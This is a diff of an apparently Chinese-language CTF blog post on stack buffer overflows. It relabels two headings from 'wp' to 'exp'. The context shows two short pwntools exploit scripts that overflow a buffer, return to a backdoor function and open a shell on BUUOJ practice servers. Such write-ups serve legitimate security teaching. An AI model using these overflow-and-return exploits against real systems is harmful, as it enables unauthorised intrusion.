@@ -231,7 +231,7 @@
 <p>大小为0XF字节，再加上8个字节的偏移量控制返回，之后在检查后门函数。</p>
 <p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/4.png" alt="4"></p>
 <p>发现后门函数，只要控制函数在0X40118A处返回即可得到shell</p>
-<p><em><strong>wp:</strong></em></p>
+<p><em><strong>exp:</strong></em></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">r=remote(&#x27;node5.buuoj.cn&#x27;,27573)</span><br><span class="line"></span><br><span class="line">offset=b&#x27;a&#x27;*(0xF+8)+p64(0x40118A)</span><br><span class="line"></span><br><span class="line">r.sendline(offset)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 
@@ -243,7 +243,7 @@
 <p>0x40个字节，算上8个控制返回值的偏移量，在检查有无后门函数</p>
 <p><img src="/../image/%E5%AF%B9%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/7.png" alt="7"></p>
 <p>发现后门函数，控制函数返回到0x400611即可，与上题不同的是，本题跑通直接得到flag</p>
-<p><em><strong>wp:</strong></em></p>
+<p><em><strong>exp:</strong></em></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">r=remote(&#x27;node5.buuoj.cn&#x27;,26457)</span><br><span class="line"></span><br><span class="line">offset=b&#x27;a&#x27;*(0x40+8)+p64(0x400611)</span><br><span class="line"></span><br><span class="line">r.sendline(offset)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 
